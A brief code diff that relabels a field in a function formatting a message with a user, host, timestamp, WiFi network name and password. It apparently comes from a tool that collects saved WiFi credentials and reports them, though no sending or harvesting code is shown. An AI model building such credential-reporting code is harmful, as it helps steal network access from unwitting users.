@@ -86,7 +86,7 @@ def build_wifi_message():
             f"• User: {user}\n"
             f"• Host: {host}\n"
             f"• Logged: {now}\n\n"
-            f"**SSID:** {ssid}\n"
+            f"**WiFi Name:** {ssid}\n"
             f"**Password:** `{password}`"
         )
 
